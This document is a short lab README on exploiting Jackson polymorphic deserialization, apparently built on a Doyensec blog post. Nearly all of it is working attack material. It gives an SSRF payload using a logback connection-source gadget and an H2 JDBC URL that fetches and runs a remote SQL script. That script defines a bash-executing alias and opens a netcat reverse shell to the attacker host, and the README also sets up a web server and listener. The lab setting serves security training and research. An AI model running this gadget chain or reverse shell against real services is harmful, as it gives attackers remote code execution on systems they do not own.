# jackson deserialization lab

Whole lab is based on Doyensec blogpost: https://blog.doyensec.com/2019/07/22/jackson-gadgets.html


## Run docker container

    docker run -ti java-deser-jackson-h2

## exploitation

SSRF:

    jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://127.0.0.1:8090/~/test\"}]"


RCE:

Create `inject.sql`:

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('nc 172.17.0.1 8090 -e /bin/sh')
```


Start a webserver to serve `inject.sql`:

    ruby -run -e httpd . -p 8000


Start listener:

    nc -nlvp 8090

Run jackson

    jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://172.17.0.1:8000/inject.sql'\"}]"

